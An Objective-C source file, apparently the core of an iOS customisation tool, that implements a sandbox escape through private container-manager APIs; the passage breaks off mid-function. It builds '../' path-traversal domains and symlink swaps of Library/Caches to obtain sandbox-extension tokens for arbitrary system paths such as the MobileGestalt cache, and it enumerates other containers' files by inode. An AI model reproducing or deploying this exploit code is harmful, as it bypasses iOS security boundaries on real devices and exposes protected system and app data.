#import "BQCore.h"
#import <dlfcn.h>
#import <CoreFoundation/CoreFoundation.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <dirent.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdlib.h>
#import <UIKit/UIKit.h>

NSString * const BQErrorDomain = @"BQErrorDomain";

static NSString * const kMGGroup = @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kMGCaches = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";


static NSString *gLogPath;
static NSLock *gLogLock;
static NSString *gGroupRoot;
static NSString *gGroupID;


static NSMutableOrderedSet<NSString *> *gTraversalFailedTargets;
static BOOL gClass2ParentEnabled;
static dispatch_queue_t gWorkQueue;

static void bq_load_preferences(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSUserDefaults *defs = NSUserDefaults.standardUserDefaults;
        gClass2ParentEnabled = [defs boolForKey:@"BQClass2ParentEnabled"];
        if ([defs boolForKey:@"BQClass2ParentCrashGuard"]) {
            gClass2ParentEnabled = NO;
            [defs setBool:NO forKey:@"BQClass2ParentEnabled"];
            [defs setBool:NO forKey:@"BQClass2ParentCrashGuard"];
            [defs synchronize];
            BQLog(@"class2-parent disabled after a previous attempt did not finish");
        }
    });
}

BOOL BQClass2ParentEnabled(void) {
    bq_load_preferences();
    return gClass2ParentEnabled;
}

void BQSetClass2ParentEnabled(BOOL on) {
    bq_load_preferences();
    gClass2ParentEnabled = on;
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQClass2ParentEnabled"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"class2-parent enabled=%d", on);
}

NSString *BQLogPath(void) {
    if (!gLogPath) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"bqtool.log"];
    }
    return gLogPath;
}

void BQLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[bqtool] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = BQLogPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) [fm createFileAtPath:path contents:nil attributes:nil];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @catch (__unused NSException *e) {}
        [fh closeFile];
    }
    [gLogLock unlock];
}

NSString *BQDocuments(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}

NSString *BQGroupID(void) {
    if (!gGroupID) {



        void *sec = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW);
        typedef CFTypeRef (*create_fn)(CFAllocatorRef);
        typedef CFTypeRef (*copy_ent_fn)(CFTypeRef, CFStringRef, CFErrorRef *);
        create_fn create = (create_fn)dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        if (!create && sec) create = (create_fn)dlsym(sec, "SecTaskCreateFromSelf");
        copy_ent_fn copy = (copy_ent_fn)dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (!copy && sec) copy = (copy_ent_fn)dlsym(sec, "SecTaskCopyValueForEntitlement");
        if (create && copy) {
            CFTypeRef task = create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copy(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (val && CFGetTypeID(val) == CFArrayGetTypeID()) {
                    CFArrayRef arr = (CFArrayRef)val;
                    for (CFIndex i = 0; i < CFArrayGetCount(arr); i++) {
                        CFTypeRef x = CFArrayGetValueAtIndex(arr, i);
                        if (x && CFGetTypeID(x) == CFStringGetTypeID()) {
                            gGroupID = [(__bridge NSString *)x copy];
                            break;
                        }
                    }
                }
                if (val) CFRelease(val);
                CFRelease(task);
            }
        }
        BQLog(@"app group entitlement: %@", gGroupID ?: @"(none)");
    }
    return gGroupID;
}

NSString *BQGroupRoot(void) {
    if (!gGroupRoot) {
        NSString *group = BQGroupID();
        if (group.length) {
            NSURL *u = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
            gGroupRoot = u.path;
        }
    }
    return gGroupRoot;
}

dispatch_queue_t BQWorkQueue(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gWorkQueue = dispatch_queue_create("com.bqtool.work", DISPATCH_QUEUE_SERIAL);
    });
    return gWorkQueue;
}


typedef void *bq_xpc_object_t;
typedef bq_xpc_object_t (*xpc_string_create_fn)(const char *);
typedef void (*xpc_release_fn)(bq_xpc_object_t);
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, bq_xpc_object_t);
typedef void (*fn_set_cstr)(void *, const char *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_str)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int (*fn_release)(int64_t);
typedef void *(*fn_err)(void *);
typedef const char *(*fn_err_msg)(void *);
typedef int (*fn_err_int)(void *);

typedef struct {
    void *h;
    fn_create create;
    fn_set_u64 set_class;
    fn_set_obj set_ids;
    fn_set_obj set_group_ids;
    fn_set_u64 set_flags;
    fn_set_u64 set_part;
    fn_set_cstr set_domain;
    fn_get_one get_one;
    fn_copy_str copy_token;
    fn_get_path get_path;
    fn_free query_free;
    fn_consume consume;
    fn_release release;
    fn_err last_error;
    fn_err_msg err_message;
    fn_err_int err_posix;
} mcm_t;

static mcm_t g;
static xpc_string_create_fn p_xpc_string_create;
static xpc_release_fn p_xpc_release;

static BOOL bq_mcm_ready(void) {
    return g.create && g.set_class && (g.set_ids || g.set_group_ids) &&
        g.set_flags && g.set_part && g.set_domain && g.get_one && g.copy_token &&
        g.get_path && g.query_free && g.consume && g.release &&
        p_xpc_string_create && p_xpc_release;
}

static void *bq_sym(void *h, const char *a, const char *b) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    return p;
}

static void bq_load_mcm(void) {
    if (g.create) return;
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g.h) {
        BQLog(@"dlopen MCM failed: %s", dlerror());
        return;
    }
    g.create = (fn_create)bq_sym(g.h, "container_query_create", NULL);
    g.set_class = (fn_set_u64)bq_sym(g.h, "container_query_set_class", NULL);
    g.set_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_identifiers", NULL);
    g.set_group_ids = (fn_set_obj)bq_sym(g.h, "container_query_set_group_identifiers", NULL);
    g.set_flags = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
    g.set_part = (fn_set_u64)bq_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
    g.set_domain = (fn_set_cstr)bq_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
    g.get_one = (fn_get_one)bq_sym(g.h, "container_query_get_single_result", NULL);
    g.copy_token = (fn_copy_str)bq_sym(g.h, "container_copy_sandbox_token", NULL);
    g.get_path = (fn_get_path)bq_sym(g.h, "container_object_get_path", NULL);
    g.query_free = (fn_free)bq_sym(g.h, "container_query_free", NULL);
    g.consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    g.last_error = (fn_err)bq_sym(g.h, "container_query_get_last_error", NULL);
    g.err_message = (fn_err_msg)bq_sym(g.h, "container_error_get_message", NULL);
    g.err_posix = (fn_err_int)bq_sym(g.h, "container_error_get_posix_errno", NULL);
    p_xpc_string_create = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    p_xpc_release = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    BQLog(@"MCM loaded=%d create=%p get=%p token=%p consume=%p release=%p",
          g.h != NULL, g.create, g.get_one, g.copy_token, g.consume, g.release);
}

static void bq_log_query_error(void *q, NSString *where) {
    if (!q || !g.last_error) return;
    void *e = g.last_error(q);
    if (!e) return;
    int posix = g.err_posix ? g.err_posix(e) : 0;
    const char *msg = g.err_message ? g.err_message(e) : NULL;
    BQLog(@"%@: last_error posix=%d msg=%s", where, posix, msg ? msg : "(null)");
}


// Removes only a symlink or an empty directory at path. A non-empty directory or a
// regular file is container data, so it is refused instead of removed recursively.
static BOOL bq_remove_only_ours(NSString *path) {
    struct stat st;
    if (lstat(path.fileSystemRepresentation, &st) != 0) return errno == ENOENT;
    if (S_ISLNK(st.st_mode)) return unlink(path.fileSystemRepresentation) == 0;
    if (S_ISDIR(st.st_mode)) return rmdir(path.fileSystemRepresentation) == 0;
    return NO;
}

static void bq_recover(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:bak]) return;
    if (!bq_remove_only_ours(path)) {
        BQLog(@"recover %@: refusing to remove existing data at %@", bak, path);
        return;
    }
    NSError *e = nil;
    if (![fm moveItemAtPath:bak toPath:path error:&e]) {
        BQLog(@"recover %@ -> %@ failed: %@", bak, path, e);
    }
}

static BOOL bq_swap_path(NSString *path, NSString *target, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (!bq_remove_only_ours(bak)) {
        BQLog(@"swap: refusing to remove existing backup data at %@", bak);
        return NO;
    }
    if ([fm fileExistsAtPath:path]) {
        NSError *e = nil;
        if (![fm moveItemAtPath:path toPath:bak error:&e]) {
            BQLog(@"swap move %@ -> %@ failed: %@", path, bak, e);
            return NO;
        }
    }
    unlink(path.fileSystemRepresentation);
    errno = 0;
    int r = symlink(target.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        BQLog(@"symlink %@ -> %@ failed errno=%d (%s)", path, target, errno, strerror(errno));
        if ([fm fileExistsAtPath:bak]) [fm moveItemAtPath:bak toPath:path error:nil];
        return NO;
    }
    return YES;
}

static void bq_restore_path(NSString *path, NSString *bak) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if ([fm fileExistsAtPath:bak]) {
        if (!bq_remove_only_ours(path)) {
            BQLog(@"restore %@: refusing to remove existing data at %@", bak, path);
            return;
        }
        NSError *e = nil;
        if (![fm moveItemAtPath:bak toPath:path error:&e]) {
            BQLog(@"restore %@ -> %@ failed: %@", bak, path, e);
        }
    } else {
        if ([fm fileExistsAtPath:path]) {
            struct stat st;
            if (lstat(path.fileSystemRepresentation, &st) == 0 && S_ISLNK(st.st_mode)) {
                [fm removeItemAtPath:path error:nil];
            }
        }
        if (![fm fileExistsAtPath:path]) {
            [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
        }
    }
}


static char *bq_list_bounded(const char *path, int64_t max_inode, NSTimeInterval deadline,
                            NSUInteger resultLimit, BOOL (^cancelled)(void), BOOL *stoppedEarly) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536, length = 0, path_length = strlen(path);
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    char buf[1200];
    NSUInteger results = 0;
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        if ((cancelled && cancelled()) ||
            (deadline > 0 && NSProcessInfo.processInfo.systemUptime >= deadline)) {
            if (stoppedEarly) *stoppedEarly = YES;
            break;
        }
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        if (strchr(p, '\n') || strchr(p, '\r')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            cap *= 2;
            char *t = realloc(out, cap);
            if (!t) break;
            out = t;
        }
        length += snprintf(out + length, cap - length, "%s\n", p);
        if (resultLimit && ++results >= resultLimit) {
            if (stoppedEarly) *stoppedEarly = YES;
            break;
        }
    }
    return out;
}

NSArray<NSString *> *BQDiscoverContainerPaths(NSString *root, NSTimeInterval timeLimit,
    NSUInteger resultLimit, BOOL (^cancelled)(void), BOOL *stoppedEarly, NSString **err) {
    if (err) *err = nil;
    if (stoppedEarly) *stoppedEarly = NO;
    if ([root hasPrefix:@"/private/var/"]) root = [root substringFromIndex:8];
    NSArray *allowed = @[@"/var/containers/Data/System", @"/var/containers/Shared/SystemGroup",
        @"/var/mobile/Containers/Data/Application", @"/var/mobile/Containers/Data/InternalDaemon",
        @"/var/mobile/Containers/Data/PluginKitPlugin", @"/var/mobile/Containers/Shared/AppGroup"];
    if (![allowed containsObject:root]) {
        if (err) *err = @"This path is not a supported container discovery root.";
        return @[];
    }
    if ((cancelled && cancelled()) || timeLimit <= 0 || resultLimit == 0) {
        if (stoppedEarly) *stoppedEarly = YES;
        return @[];
    }
    NSTimeInterval deadline = NSProcessInfo.processInfo.systemUptime + MIN(timeLimit, 1.5);
    char *buffer = bq_list_bounded(root.fileSystemRepresentation, 400000, deadline,
        MIN(resultLimit, (NSUInteger)1024), cancelled, stoppedEarly);
    if (!buffer) {
        if (err) *err = @"The device did not expose paths for this container root.";
        return @[];
    }
    NSString *paths = [[NSString alloc] initWithBytes:buffer length:strlen(buffer) encoding:NSUTF8StringEncoding];
    free(buffer);
    NSMutableArray *result = [NSMutableArray array];
    for (NSString *path in [paths componentsSeparatedByString:@"\n"]) {
        if (path.length && [path.stringByDeletingLastPathComponent isEqualToString:root]) [result addObject:path];
    }
    return result;
}

NSArray<NSString *> *BQDiscoverLSStorePaths(NSTimeInterval timeLimit, NSUInteger resultLimit,
    BOOL (^cancelled)(void), BOOL *stoppedEarly, NSString **err) {
    if (err) *err = nil;
    if (stoppedEarly) *stoppedEarly = NO;
    if (timeLimit <= 0 || !resultLimit || (cancelled && cancelled())) return @[];


    NSString *templatePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@".cc365-ls-probe-XXXXXX"];
    char *temporary = strdup(templatePath.fileSystemRepresentation);
    if (!temporary) return @[];
    int probe = mkstemp(temporary);
    struct stat st; struct statfs volume;
    BOOL valid = probe >= 0 && fstat(probe, &st) == 0 && fstatfs(probe, &volume) == 0 && st.st_ino > 0;
    if (probe >= 0) { close(probe); unlink(temporary); }
    free(temporary);
    if (!valid) { if (err) *err = @"Chưa xác định được vùng lưu danh mục ứng dụng."; return @[]; }
    NSTimeInterval deadline = NSProcessInfo.processInfo.systemUptime + MIN(timeLimit, 8.0);
    NSMutableOrderedSet<NSString *> *paths = [NSMutableOrderedSet new];
    fsid_t fsid = volume.f_fsid;
    char bytes[PATH_MAX];
    for (uint64_t inode = st.st_ino; inode > 0; inode--) {
        if ((inode & 127) == 0 && ((cancelled && cancelled()) || NSProcessInfo.processInfo.systemUptime >= deadline)) {
            if (stoppedEarly) *stoppedEarly = YES;
            break;
        }
        ssize_t length = fsgetpath(bytes, sizeof(bytes), &fsid, inode);
        if (length <= 0 || !memchr(bytes, 0, sizeof(bytes))) continue;
        NSString *path = [NSString stringWithUTF8String:bytes];
        if ([path hasPrefix:@"/private/var/"]) path = [path substringFromIndex:8];
        NSString *prefix = @"/var/mobile/Containers/Data/InternalDaemon/";
        if (![path hasPrefix:prefix]) continue;
        NSArray<NSString *> *parts = [[path substringFromIndex:prefix.length] componentsSeparatedByString:@"/"];
        if (parts.count != 4 || parts[0].length != 36 || ![[NSUUID alloc] initWithUUIDString:parts[0]] ||
            ![parts[1] isEqual:@"Library"] || ![parts[2] isEqual:@"Caches"]) continue;
        NSString *name = parts[3];
        if (![name hasPrefix:@"com.apple.LaunchServices-"] || ![name hasSuffix:@".csstore"] ||
            name.length <= [@"com.apple.LaunchServices-.csstore" length] || name.length > 255 || [name containsString:@"\\"] ||
            [name rangeOfCharacterFromSet:NSCharacterSet.controlCharacterSet].location != NSNotFound) continue;
        [paths addObject:path];


        if (paths.count == 1) deadline = MIN(deadline, NSProcessInfo.processInfo.systemUptime + 0.1);
        if (paths.count >= MIN(resultLimit, (NSUInteger)8)) break;
    }
    return paths.array;
}


BOOL BQCoreInit(void) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        NSString *docs = BQDocuments();

        [[NSFileManager defaultManager] createDirectoryAtPath:docs
                                  withIntermediateDirectories:YES attributes:nil error:nil];
        bq_load_preferences();
        BQLog(@"=== BQEscape start | iOS %@ | bundle %@ ===",
              [UIDevice currentDevice].systemVersion, [[NSBundle mainBundle] bundleIdentifier]);
        bq_load_mcm();
        if (!bq_mcm_ready()) {
            BQLog(@"core init unavailable: create=%p class=%p ids=%p groups=%p flags=%p part=%p domain=%p get=%p token=%p path=%p free=%p consume=%p release=%p xpcCreate=%p xpcRelease=%p",
                  g.create, g.set_class, g.set_ids, g.set_group_ids, g.set_flags,
                  g.set_part, g.set_domain, g.get_one, g.copy_token, g.get_path,
                  g.query_free, g.consume, g.release, p_xpc_string_create, p_xpc_release);
            return;
        }
        NSString *gid = BQGroupID();
        NSString *root = BQGroupRoot();
        BQLog(@"app group: id=%@ root=%@", gid ?: @"(none)", root ?: @"(none)");
        ok = YES;
        BQLog(@"core init ok=%d", ok);
    });
    return ok;
}


static NSString *bq_dots(int n) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < n; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

static NSString *bq_traversal_cache_key(NSString *target) {
    NSString *path = target.stringByStandardizingPath;
    if ([path hasPrefix:@"/private/var/"]) path = [path substringFromIndex:8];
    return path;
}

static BOOL bq_should_try_traversal(NSString *target) {
    return ![gTraversalFailedTargets containsObject:bq_traversal_cache_key(target)];
}

static void bq_remember_traversal_failure(NSString *target) {
    if (!gTraversalFailedTargets) gTraversalFailedTargets = [NSMutableOrderedSet orderedSet];
    NSString *key = bq_traversal_cache_key(target);
    if ([gTraversalFailedTargets containsObject:key]) return;
    if (gTraversalFailedTargets.count >= 128) [gTraversalFailedTargets removeObjectAtIndex:0];
    [gTraversalFailedTargets addObject:key];
}

static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
                               uint64_t part, NSString *domain, uint64_t flags,
                               NSString *label, NSString **outPath) {
    if (!bq_mcm_ready()) return -7;
    if (!ident.length) return -1;
    void *q = g.create();
    if (!q) return -2;
    g.set_class(q, cls);
    bq_xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
    if (g.set_flags) g.set_flags(q, flags);
    if (x && p_xpc_release) p_xpc_release(x);

    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"strategy %@: cls=%llu ident=%@ part=%llu result=%p path=%@ token=%s consume=%lld",
          label, cls, ident, part, res, path ?: @"(null)", tok ? "YES" : "NO", (long long)h);
    if (!res) bq_log_query_error(q, label);
    if (tok) free(tok);
    g.query_free(q);
    if (h >= 0 && outPath) *outPath = path;
    return h;
}







static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) return -6;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.bqtool"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];



    if ([fm fileExistsAtPath:bak]) {
        struct stat st;
        BOOL temp = ([fm fileExistsAtPath:lib] &&
                     lstat(caches.fileSystemRepresentation, &st) == 0 &&
                     S_ISLNK(st.st_mode));
        if (temp || ![fm fileExistsAtPath:lib]) {
            bq_restore_path(lib, bak);
        } else {
            BQLog(@"class2-parent: stale %@ exists; refusing to touch %@", bak, lib);
            return -2;
        }
    }
    if (![fm fileExistsAtPath:lib]) return -2;

    NSError *e = nil;
    if (![fm moveItemAtPath:lib toPath:bak error:&e]) {
        BQLog(@"class2-parent: move Library -> bak failed: %@", e);
        return -2;
    }
    if (![fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:&e]) {
        BQLog(@"class2-parent: recreate Library failed: %@", e);
        [fm moveItemAtPath:bak toPath:lib error:nil];
        return -2;
    }
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        BQLog(@"class2-parent: symlink Caches failed errno=%d (%s)", errno, strerror(errno));
        bq_restore_path(lib, bak);
        return -2;
    }

    NSString *path = nil;
    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8100000000ULL,
                                @"class2-parent", &path);


    unlink(caches.fileSystemRepresentation);
    rmdir(lib.fileSystemRepresentation);
    NSError *re = nil;
    if (![fm moveItemAtPath:bak toPath:lib error:&re]) {
        BQLog(@"class2-parent: restore Library failed: %@", re);
        bq_restore_path(lib, bak);
    }
    if (h >= 0) {
        if (linkOut) *linkOut = target;
        BQLog(@"escape: using class2 parent -> %@", target);
        return h;
    }
    return h;
}

static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
    NSString *groot = BQGroupRoot();
    NSString *gid = BQGroupID();
    if (!groot.length || !gid.length) return -6;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
    bq_recover(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
    bq_recover(caches, bak);
    if (![fm fileExistsAtPath:caches]) {
        [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    }
    if (!bq_swap_path(caches, target, bak)) {
        bq_restore_path(caches, bak);
        return -2;
    }
    NSString *path = nil;
    int64_t h = bq_query_escape(7, gid, YES, 3, @"", 0x8100000000ULL, @"class7-symlink", &path);
    if (h >= 0) {
        if (linkOut) *linkOut = caches;
        return h;
    }
    bq_restore_path(caches, bak);
    return h;
}

int64_t BQEscape(NSString *target, NSString **linkOut) {
    if (linkOut) *linkOut = nil;
    if (!target.length) return -1;
    if (!BQCoreInit()) return -7;
    int64_t last = -1;



    if (target.isAbsolutePath && bq_should_try_traversal(target)) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, dom, 0x8100000000ULL,
                                    @"class13-traversal", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 traversal -> %@", p ?: target);
            return h;
        }
        bq_remember_traversal_failure(target);
        last = h;
    }


    NSString *gid = BQGroupID();
    if (gid.length) {
        NSString *link = nil;
        int64_t h = bq_escape_symlink(target, &link);
        if (h >= 0) {
            if (linkOut) *linkOut = link;
            BQLog(@"escape: using class7 symlink");
            return h;
        }
        last = h;
    }





    if (gClass2ParentEnabled) {
        NSString *link = nil;


        [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"BQClass2ParentCrashGuard"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        int64_t h = bq_escape_class2_parent(target, &link);
        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"BQClass2ParentCrashGuard"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        if (h >= 0) {
            if (linkOut) *linkOut = link ?: target;
            BQLog(@"escape: using class2 parent");
            return h;
        }
        last = h;
    } else {
        BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
    }


    if ([target isEqualToString:kMGCaches]) {
        NSString *p = nil;
        int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
                                    @"class13-direct", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class13 direct");
            return h;
        }
        last = h;
    }


    if (target.isAbsolutePath) {
        NSString *dom = [bq_dots(12) stringByAppendingString:target];
        NSString *p = nil;
        int64_t h = bq_query_escape(12, @"com.apple.geod", NO, 3, dom, 0x8100000000ULL,
                                    @"class12-geod-traversal", &p);
        if (h >= 0) {
            if (linkOut) *linkOut = p ?: target;
            BQLog(@"escape: using class12 geod traversal");
            return h;
        }
        last = h;
    }

    BQLog(@"escape: all strategies failed (last=%lld) target=%@", (long long)last, target);
    return last;
}

static NSString *bq_escape_error(int64_t h) {
    if (h == -7) {
        return @"Required BQCore APIs are unavailable on this iOS build. You can still use local Files and Photo Wallpaper. Check Settings > Open Log for details.";
    }
    if (h == -6) {
        return @"no app group — open Settings → Class-2 fallback (experimental), enable it, then retry";
    }
    if (h == -2) {
        return @"class-2 fallback could not move Library — this build needs an app group on 27.2";
    }
    if (h == -5) {
        return @"the MCM query returned no sandbox token — send Documents/bqtool.log";
    }
    return [NSString stringWithFormat:@"escape failed (%lld)", (long long)h];
}

void BQEndEscape(int64_t handle) {
    if (handle >= 0 && g.release) g.release(handle);
    NSString *groot = BQGroupRoot();
    if (!groot.length) return;
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
    bq_restore_path(caches, bak);
}

static int bq_probe_base(NSString *base, uint64_t cls, NSString *ident, NSString *target, NSString *label) {
    if (!base.length || !ident.length) {
        BQLog(@"probe[%@]: missing base/identifier", label);
        return -1;
    }
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [base stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.probe"];
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
    bq_recover(caches, bak);
    if (![fm fileExistsAtPath:caches]) {
        [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    }
    BQLog(@"probe[%@]: base=%@ target=%@", label, base, target);
    if (!bq_swap_path(caches, target, bak)) {
        bq_restore_path(caches, bak);
        return -2;
    }
    void *q = g.create();
    if (!q) { bq_restore_path(caches, bak); return -3; }
    g.set_class(q, cls);
    bq_xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (cls == 7 && g.set_group_ids) g.set_group_ids(q, x);
    else if (g.set_ids) g.set_ids(q, x);
    else if (g.set_group_ids) g.set_group_ids(q, x);
    if (g.set_part) g.set_part(q, 3);
    if (g.set_flags) g.set_flags(q, 0x8100000000ULL);
    if (x && p_xpc_release) p_xpc_release(x);
    void *res = g.get_one(q);
    BQLog(@"probe[%@]: result=%p", label, res);
    if (!res) {
        bq_log_query_error(q, label);
        g.query_free(q);
        bq_restore_path(caches, bak);
        return -4;
    }
    char *tok = g.copy_token ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    BQLog(@"probe[%@]: token=%s consume=%lld", label, tok ? "YES" : "NO", (long long)h);
    if (tok) free(tok);
    g.query_free(q);
    int rc = -6;
    if (h >= 0) {
        NSString *leaf = [NSString stringWithFormat:@".bqtool_probe_%d", getpid()];
        NSString *p = [caches stringByAppendingPathComponent:leaf];
        int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
        if (fd >= 0) {
            ssize_t w = write(fd, "ok", 2);
            close(fd);
            unlink(p.fileSystemRepresentation);
            rc = (w == 2) ? 0 : -7;
            BQLog(@"probe[%@]: marker=%s", label, rc == 0 ? "OK" : "write-failed");
        } else {
            BQLog(@"probe[%@]: marker open failed errno=%d", label, errno);
            rc = -7;
        }
        g.release(h);
    }
    bq_restore_path(caches, bak);
    return rc;
}

NSDictionary *BQProbeEscapeClasses(NSString *target) {
    if (!BQCoreInit()) return @{@"error": bq_escape_error(-7)};
    NSMutableDictionary *r = [NSMutableDictionary dictionary];
    NSString *bundle = [[NSBundle mainBundle] bundleIdentifier];
    NSString *gid = BQGroupID();
    NSString *groot = BQGroupRoot();
    r[@"bundle"] = bundle ?: @"(nil)";
    r[@"group_id"] = gid ?: @"(none)";
    r[@"group_root"] = groot ?: @"(none)";
    r[@"own_home"] = NSHomeDirectory() ?: @"(nil)";
    r[@"class7"] = @(bq_probe_base(groot, 7, gid, target, @"class7"));
    r[@"class2"] = @(bq_probe_base(NSHomeDirectory(), 2, bundle, target, @"class2"));
    BQLog(@"probe summary: %@", r);
    return r;
}

static char *bq_query_part_path(uint64_t cls, NSString *ident, uint64_t part, uint64_t flags) {
    if (!bq_mcm_ready()) return NULL;
    void *q = g.create();
    if (!q) return NULL;
    g.set_class(q, cls);
    bq_xpc_object_t x = p_xpc_string_create ? p_xpc_string_create(ident.UTF8String) : NULL;
    if (cls == 7 && g.set_group_ids) g.set_group_ids(q, x);
